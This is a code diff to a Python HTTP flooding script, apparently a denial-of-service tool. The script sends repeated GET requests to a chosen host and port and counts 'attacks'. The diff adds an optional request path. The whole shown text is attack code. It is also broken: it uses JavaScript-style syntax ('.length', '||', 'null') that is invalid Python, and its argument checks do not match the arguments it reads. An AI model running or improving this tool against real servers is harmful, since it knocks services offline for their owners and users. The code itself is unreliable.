@@ -28,7 +28,7 @@ elif len(sys.argv) == 4:
     port = int(sys.argv[2])
     num_requests = int(sys.argv[3])
 else:
-    print (f"ERROR\n Usage: {sys.argv[0]} < Hostname > < Port > < Number_of_Attacks >")
+    print (f"ERROR\n Usage: {sys.argv[0]} < Hostname > < Port > < Number_of_Attacks > < Path >")
     sys.exit(1)
 
 # Convert FQDN to IP
@@ -67,7 +67,7 @@ def generate_url_path():
 def attack():
     print_status()
     if sys.argv[5].length < 1 || sys.argv[5] == null:
-        url_path = generate_url_path()
+        url_path = "/" + generate_url_path()
     else:
         url_path = sys.argv[5]
 
@@ -80,7 +80,7 @@ def attack():
 
         # Send the request according to HTTP spec
         #old : dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
-        byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
+        byt = (f"GET {url_path} HTTP/1.1\nHost: {host}\n\n").encode()
         dos.send(byt)
     except socket.error:
         print (f"\n [ No connection, server may be down ]: {str(socket.error)}")
